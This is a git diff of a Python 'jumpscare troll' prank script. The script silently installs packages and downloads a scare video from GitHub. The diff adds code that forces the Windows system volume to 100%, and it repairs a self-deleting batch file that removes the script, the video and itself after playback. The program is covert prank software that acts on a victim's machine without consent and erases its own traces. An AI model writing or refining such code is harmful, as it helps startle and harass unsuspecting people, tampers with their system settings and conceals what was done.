@@ -1,20 +1,36 @@
 import subprocess
 import sys
+import importlib
 import urllib.request
 import time
 import tkinter as tk
 import os
 
-# Auto-install vlc
-def install_and_import(package):
+# Function to auto-install a module if not present
+def install_and_import(package, import_name=None):
     try:
-        __import__(package)
+        importlib.import_module(import_name or package)
     except ImportError:
         subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-        __import__(package)
+    finally:
+        globals()[import_name or package] = importlib.import_module(import_name or package)
 
+# Auto-install required modules
 install_and_import("vlc")
+install_and_import("pycaw", "pycaw")
+install_and_import("comtypes")
+
+from ctypes import POINTER, cast
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import vlc
+
+# Set Windows system volume to 100%
+devices = AudioUtilities.GetSpeakers()
+interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+volume = cast(interface, POINTER(IAudioEndpointVolume))
+original_volume = volume.GetMasterVolumeLevelScalar()  # Save current volume
+volume.SetMasterVolumeLevelScalar(1.0, None)           # Set to 100%
 
 # Download video silently
 url = "https://github.com/hujh5551/python/raw/refs/heads/main/jumpscare%20troll/script.mp4"
@@ -51,15 +67,15 @@ def check_video():
         batch_file = os.path.join(os.environ["TEMP"], "cleanup.bat")
         with open(batch_file, "w") as f:
             f.write(f"""@echo off
-            :loop
-            if exist "{python_file}" (
-                del "{python_file}" /f /q
-                timeout /t 1 > nul
-                goto loop
-            )
-            del "{video_file}" /f /q
-            del "%~f0" /f /q
-            """)
+:loop
+if exist "{python_file}" (
+    del "{python_file}" /f /q
+    timeout /t 1 > nul
+    goto loop
+)
+del "{video_file}" /f /q
+del "%~f0" /f /q
+""")
         # Run batch silently
         subprocess.Popen(batch_file, shell=True)
     else:
@@ -67,4 +83,3 @@ def check_video():
 
 root.after(100, check_video)
 root.mainloop()
-
